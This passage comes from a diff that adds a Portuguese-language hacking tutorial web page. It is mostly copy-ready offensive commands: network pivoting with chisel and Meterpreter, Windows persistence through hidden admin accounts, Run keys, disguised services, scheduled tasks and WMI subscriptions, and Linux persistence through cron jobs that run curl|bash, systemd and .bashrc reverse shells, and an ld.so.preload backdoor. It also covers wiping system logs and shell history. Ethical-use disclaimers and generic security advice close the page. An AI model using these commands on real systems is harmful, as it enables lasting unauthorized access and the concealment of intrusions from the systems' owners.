+<span class="command">./chisel</span> client 192.168.1.10:8080 R:socks</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Meterpreter Pivoting</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Descobrir rotas</span>
+<span class="command">run</span> get_local_subnets
+
+<span class="comment"># Adicionar rota</span>
+<span class="command">run</span> autoroute -s 192.168.2.0/24
+
+<span class="comment"># Ou</span>
+<span class="command">route</span> add 192.168.2.0 255.255.255.0 1
+
+<span class="comment"># Criar SOCKS</span>
+<span class="command">use</span> auxiliary/server/socks_proxy
+<span class="command">set</span> SRVPORT 9050
+<span class="command">set</span> VERSION 5
+<span class="command">run</span></code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Persistência</h3>
+                        <p>Técnicas para manter o acesso após uma exploração bem-sucedida, permitindo reconexão ao sistema mesmo após reinicializações.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fab fa-windows"></i> Persistência em Windows</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Adicionar Usuário</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">net</span> user hacker Senha123! /add
+<span class="command">net</span> localgroup administrators hacker /add</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Registro de Inicialização</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">reg</span> add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\Windows\temp\backdoor.exe"</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Serviço Persistente</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sc</span> create backdoor binpath= "C:\Windows\temp\backdoor.exe" start= auto
+<span class="command">sc</span> description backdoor "Serviço essencial de atualização"</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Tarefa Agendada</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">schtasks</span> /create /tn "Windows Update" /tr "C:\Windows\temp\backdoor.exe" /sc onlogon /ru "System"</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">WMI Persistence</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">wmic</span> /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="backdoor", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+<span class="command">wmic</span> /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="backdoor", ExecutablePath="C:\Windows\temp\backdoor.exe", CommandLineTemplate="C:\Windows\temp\backdoor.exe"
+<span class="command">wmic</span> /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"backdoor\"", Consumer="CommandLineEventConsumer.Name=\"backdoor\""</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Meterpreter Persistence</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">run</span> persistence -U -i 60 -p 443 -r 192.168.1.10</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fab fa-linux"></i> Persistência em Linux</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Adicionar Usuário</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">useradd</span> -m -s /bin/bash -G sudo hacker
+<span class="command">echo</span> "hacker:Senha123!" | chpasswd</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Chave SSH</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">mkdir</span> -p /root/.ssh/
+<span class="command">echo</span> "ssh-rsa AAAAB3Nz..." > /root/.ssh/authorized_keys
+<span class="command">chmod</span> 700 /root/.ssh
+<span class="command">chmod</span> 600 /root/.ssh/authorized_keys</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Crontab</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">echo</span> "*/10 * * * * /usr/bin/curl -s http://192.168.1.10/backdoor.sh | bash" >> /etc/crontab</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Systemd Service</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">cat</span> > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=Sistema de Atualização
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+<span class="command">systemctl</span> enable backdoor.service
+<span class="command">systemctl</span> start backdoor.service</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Arquivo .bashrc</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">echo</span> "nohup bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1' &>/dev/null &" >> ~/.bashrc</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Backdoor em Biblioteca</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">echo</span> 'void __attribute__ ((constructor)) init() {
+    system("mkdir -p /root/.ssh/ 2>/dev/null");
+    system("echo \"ssh-rsa AAAAB3Nz...\" >> /root/.ssh/authorized_keys 2>/dev/null");
+    system("chmod 700 /root/.ssh/ 2>/dev/null");
+    system("chmod 600 /root/.ssh/authorized_keys 2>/dev/null");
+}' > /tmp/backdoor.c
+
+<span class="command">gcc</span> -shared -fPIC /tmp/backdoor.c -o /usr/lib/libbackdoor.so
+<span class="command">echo</span> "/usr/lib/libbackdoor.so" >> /etc/ld.so.preload</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="limpeza" class="content-section">
+                    <h2 class="section-title">Limpeza de Rastros</h2>
+                    <p>Após concluir o teste de penetração, é importante limpar todos os rastros para restaurar o sistema ao seu estado original.</p>
+                    
+                    <div class="tool-box">
+                        <h3><i class="fas fa-broom"></i> Limpeza em Windows</h3>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Limpeza de Logs</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">wevtutil</span> cl System
+<span class="command">wevtutil</span> cl Security
+<span class="command">wevtutil</span> cl Application</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Arquivos</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">del</span> /f /q C:\Users\%USERNAME%\AppData\Local\Temp\*
+<span class="command">del</span> /f /q C:\Windows\Temp\*
+<span class="command">del</span> /f /q C:\Windows\Prefetch\*</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Limpar Histórico de PowerShell</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">Remove-Item</span> (Get-PSReadlineOption).HistorySavePath</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Tarefas Agendadas</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">schtasks</span> /delete /tn "Windows Update" /f</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Serviços</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">sc</span> stop backdoor
+<span class="command">sc</span> delete backdoor</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Usuários</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">net</span> user hacker /delete</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-box">
+                        <h3><i class="fas fa-broom"></i> Limpeza em Linux</h3>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Limpar Logs</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">echo</span> > /var/log/auth.log
+<span class="command">echo</span> > /var/log/syslog
+<span class="command">echo</span> > /var/log/messages
+<span class="command">echo</span> > /var/log/apache2/access.log
+<span class="command">echo</span> > /var/log/apache2/error.log</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Histórico de Comandos</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">history</span> -c
+<span class="command">echo</span> > ~/.bash_history
+<span class="command">rm</span> -f ~/.bash_history</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Tarefas Cron</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">crontab</span> -r
+<span class="command">sed</span> -i '/backdoor/d' /etc/crontab</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Serviços Systemd</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">systemctl</span> stop backdoor.service
+<span class="command">systemctl</span> disable backdoor.service
+<span class="command">rm</span> -f /etc/systemd/system/backdoor.service
+<span class="command">systemctl</span> daemon-reload</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Chaves SSH</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">rm</span> -f /root/.ssh/authorized_keys
+<span class="command">rm</span> -f /home/*/.ssh/authorized_keys</code></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-title">Remover Usuários</span>
+                                <button class="code-copy"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <div class="code-content">
+                                <pre><code><span class="command">userdel</span> -r hacker</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="conclusao" class="content-section">
+                    <h2 class="section-title">Conclusão e Melhores Práticas</h2>
+                    <p>A segurança da informação é um processo contínuo, não um produto ou destino final. Ao concluir um teste de penetração, é essencial documentar adequadamente os resultados, fornecer recomendações claras e trabalhar com as equipes para implementar as correções necessárias.</p>
+                    
+                    <div class="content-box">
+                        <h3>Recomendações de Segurança</h3>
+                        <ul>
+                            <li><strong>Manter sistemas atualizados</strong>: Aplicar patches e atualizações regularmente</li>
+                            <li><strong>Princípio do menor privilégio</strong>: Conceder apenas os privilégios mínimos necessários</li>
+                            <li><strong>Autenticação forte</strong>: Implementar autenticação multifator e políticas de senhas fortes</li>
+                            <li><strong>Segmentação de rede</strong>: Dividir a rede em zonas para limitar o acesso</li>
+                            <li><strong>Monitoramento contínuo</strong>: Implementar sistemas de detecção e resposta a incidentes</li>
+                            <li><strong>Treinamento de segurança</strong>: Educar usuários sobre ameaças e práticas seguras</li>
+                            <li><strong>Backups regulares</strong>: Manter backups off-site e testar a restauração periodicamente</li>
+                            <li><strong>Testes periódicos</strong>: Realizar testes de penetração e análises de vulnerabilidade regulares</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <h3><i class="fas fa-shield-alt"></i> Lembre-se</h3>
+                        <p>A segurança não é um estado final, mas um processo contínuo de avaliação, implementação, testes e melhorias. As ameaças evoluem constantemente, e as defesas devem acompanhar essa evolução.</p>
+                        <p>Sempre use seu conhecimento de forma ética e responsável. O objetivo de aprender técnicas de invasão é fortalecer a segurança, não comprometê-la.</p>
+                    </div>
+                </section>
+            </div>
+            
+            <div class="sidebar">
+                <div class="toc">
+                    <h3>Índice</h3>
+                    <ul>
+                        <li><a href="#introducao">Introdução à Invasão de Sistemas</a></li>
+                        <li><a href="#reconhecimento">Reconhecimento (Footprinting)</a>
+                            <ul>
+                                <li><a href="#osint">OSINT</a></li>
+                                <li><a href="#subdomains">Enumeração de Subdomínios</a></li>
+                                <li><a href="#dns-recon">DNS Recon</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#escaneamento">Escaneamento e Enumeração</a>
+                            <ul>
+                                <li><a href="#port-scanning">Escaneamento de Portas</a></li>
+                                <li><a href="#vuln-scanning">Escaneamento de Vulnerabilidades</a></li>
+                                <li><a href="#service-enum">Enumeração de Serviços</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#exploracao">Exploração de Vulnerabilidades</a>
+                            <ul>
+                                <li><a href="#metasploit">Metasploit Framework</a></li>
+                                <li><a href="#web-exploits">Exploração Web</a></li>
+                                <li><a href="#payloads">Geração de Payloads</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#pos-exploracao">Pós-Exploração</a>
+                            <ul>
+                                <li><a href="#priv-esc-win">Escalonamento de Privilégios (Windows)</a></li>
+                                <li><a href="#priv-esc-linux">Escalonamento de Privilégios (Linux)</a></li>
+                                <li><a href="#lateral-movement">Movimentação Lateral</a></li>
+                                <li><a href="#persistence">Persistência</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#limpeza">Limpeza de Rastros</a></li>
+                        <li><a href="#conclusao">Conclusão e Melhores Práticas</a></li>
+                    </ul>
+                </div>
+                
+                <div class="tool-card">
+                    <h4><i class="fas fa-tools"></i> Ferramentas Essenciais</h4>
+                    <ul>
+                        <li>Kali Linux</li>
+                        <li>Metasploit Framework</li>
+                        <li>Nmap</li>
+                        <li>Burp Suite</li>
+                        <li>Wireshark</li>
+                        <li>Hydra</li>
+                        <li>SQLmap</li>
+                        <li>John the Ripper</li>
+                        <li>Mimikatz</li>
+                        <li>Responder</li>
+                    </ul>
+                    <a href="#" class="btn-link">Ver Lista Completa</a>
+                </div>
+                
+                <div class="warning-box">
+                    <h3><i class="fas fa-exclamation-triangle"></i> Atenção</h3>
+                    <p>As técnicas descritas nesta página são para fins educacionais e devem ser praticadas apenas em ambientes controlados e com autorização.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-logo">CyberHack</div>
+                <div class="footer-links">
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">FAQ</a>
+                    <a href="contato.html">Contato</a>
+                </div>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <a href="#" class="back-to-top" id="backToTop"><i class="fas fa-arrow-up"></i></a>
+    <div class="digital-numbers">ID: <span id="random-numbers">29384756</span></div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Canvas Background
+            const canvas = document.getElementById('canvas');
+            const renderer = new THREE.WebGLRenderer({
+                canvas,
+                antialias: true,
+                alpha: true
+            });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(window.devicePixelRatio);
+
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 5;
+
+            const particlesGeometry = new THREE.BufferGeometry();
+            const particlesCount = 2000;
+            
+            const positions = new Float32Array(particlesCount * 3);
+            const colors = new Float32Array(particlesCount * 3);
+            const sizes = new Float32Array(particlesCount);
+            
+            for (let i = 0; i < particlesCount * 3; i += 3) {
+                positions[i] = (Math.random() - 0.5) * 20;
+                positions[i + 1] = (Math.random() - 0.5) * 20;
+                positions[i + 2] = (Math.random() - 0.5) * 20;
+                
+                colors[i] = Math.random() * 0.5 + 0.5;
+                colors[i + 1] = Math.random() * 0.2;
+                colors[i + 2] = Math.random() * 0.5 + 0.5;
+                
+                sizes[i/3] = Math.random() * 0.5 + 0.5;
+            }
+            
+            particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+            particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+            particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
+            
+            const particlesMaterial = new THREE.PointsMaterial({
+                size: 0.1,
+                vertexColors: true,
+                transparent: true,
+                opacity: 0.8,
+                sizeAttenuation: true,
+                map: createCircleTexture()
+            });
+            
+            function createCircleTexture() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 64;
+                canvas.height = 64;
+                
+                const context = canvas.getContext('2d');
+                context.clearRect(0, 0, canvas.width, canvas.height);
+                
+                const centerX = canvas.width / 2;
+                const centerY = canvas.height / 2;
+                const radius = canvas.width / 2.5;
+                
+                context.beginPath();
+                context.arc(centerX, centerY, radius, 0, 2 * Math.PI, false);
+                
+                const gradient = context.createRadialGradient(centerX, centerY, 0, centerX, centerY, radius);
+                gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
+                gradient.addColorStop(0.5, 'rgba(255, 105, 180, 0.8)');
+                gradient.addColorStop(1, 'rgba(255, 105, 180, 0)');
+                
+                context.fillStyle = gradient;
+                context.fill();
+                
+                const texture = new THREE.Texture(canvas);
+                texture.needsUpdate = true;
+                return texture;
+            }
+            
+            const particles = new THREE.Points(particlesGeometry, particlesMaterial);
+            scene.add(particles);
+
+            let mouseX = 0;
+            let mouseY = 0;
+            let targetX = 0;
+            let targetY = 0;
+            
+            document.addEventListener('mousemove', (event) => {
+                mouseX = (event.clientX / window.innerWidth) * 2 - 1;
+                mouseY = -(event.clientY / window.innerHeight) * 2 + 1;
+            });
+
+            function animate() {
+                requestAnimationFrame(animate);
+                
+                targetX = mouseX * 0.2;
+                targetY = mouseY * 0.2;
+                
+                particles.rotation.x += 0.0005;
+                particles.rotation.y += 0.001;
+                
+                particles.rotation.y += (targetX - particles.rotation.y) * 0.05;
+                particles.rotation.x += (targetY - particles.rotation.x) * 0.05;
+                
+                const positions = particles.geometry.attributes.position.array;
+                for (let i = 0; i < positions.length; i += 3) {
+                    positions[i + 1] += Math.sin(Date.now() * 0.001 + positions[i] * 0.1) * 0.002;
+                }
+                particles.geometry.attributes.position.needsUpdate = true;
+                
+                renderer.render(scene, camera);
+            }
+
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+
+            animate();
+            
+            // Random numbers
+            setInterval(() => {
+                document.getElementById('random-numbers').textContent = Math.floor(Math.random() * 100000000).toString();
+            }, 1000);
+            
+            // Back to top button
+            const backToTopButton = document.getElementById('backToTop');
+            
+            window.addEventListener('scroll', () => {
+                if (window.pageYOffset > 300) {
+                    backToTopButton.classList.add('active');
+                } else {
+                    backToTopButton.classList.remove('active');
+                }
+            });
+            
+            backToTopButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+            
+            // Tabs
+            const tabButtons = document.querySelectorAll('.tab-btn');
+            
+            tabButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const tabId = button.getAttribute('data-tab');
+                    
+                    // Remove active class from all buttons and content
+                    document.querySelectorAll('.tab-btn').forEach(btn => {
+                        btn.classList.remove('active');
+                    });
+                    
+                    document.querySelectorAll('.tab-content').forEach(content => {
+                        content.classList.remove('active');
+                    });
+                    
+                    // Add active class to current button and content
+                    button.classList.add('active');
+                    document.getElementById(tabId + '-content').classList.add('active');
+                });
+            });
+            
+            // Copy code functionality
+            const copyButtons = document.querySelectorAll('.code-copy');
+            
+            copyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const codeBlock = button.closest('.code-block').querySelector('code');
+                    const textToCopy = codeBlock.innerText;
+                    
+                    navigator.clipboard.writeText(textToCopy).then(() => {
+                        const originalIcon = button.innerHTML;
+                        button.innerHTML = '<i class="fas fa-check"></i>';
+                        
+                        setTimeout(() => {
+                            button.innerHTML = originalIcon;
+                        }, 2000);
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
